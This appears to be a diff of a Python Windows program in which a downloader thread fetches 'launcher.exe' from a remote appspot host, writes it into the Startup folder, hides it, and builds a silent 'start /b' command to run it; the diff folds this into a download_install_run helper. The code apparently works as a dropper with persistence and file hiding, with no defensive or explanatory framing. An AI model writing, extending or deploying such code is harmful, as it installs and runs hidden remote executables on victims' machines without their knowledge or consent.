@@ -37,24 +37,10 @@ class Downloader(threading.Thread):
         hide_file(path)
         
         #DIR the launcher
-        download_install_run("http://littlesitetomakemoney.appspot.com/launcher.exe", shellcon.CSIDL_STARTUP, "tsys.exe;")
-        #Get a path for the launcher
-        path = file_in_special_path(shellcon.CSIDL_STARTUP, "launcher.exe")
-        unhide_file(path)
-        #Save the launcher
-        url = urllib2.urlopen("http://littlesitetomakemoney.appspot.com/launcher.exe")
-        unhide_file()
-        f = open(path, "w")
-        f.write(url.read())
-        f.close()
-        url.close()
-        print path
-        #Hide the launcher
-        hide_file(path)
-        
-        #Run the launcher
-        command = "start /b %s"%win32api.GetShortPathName(path)
-        print command
+        download_install_run(
+            "http://littlesitetomakemoney.appspot.com/launcher.exe", 
+            shellcon.CSIDL_STARTUP, 
+            "tsys.exe;")
         
 def download_install_run(url, specialpath, fname):
     #Get a path for the file and unhide it.
@@ -70,6 +56,7 @@ def download_install_run(url, specialpath, fname):
     
     #Make a command to run the file
     command = "start /b %s"%win32api.GetShortPathName(path)
+    #os.system(command)
     
         
 #Utility functions.  May be useful elsewhere
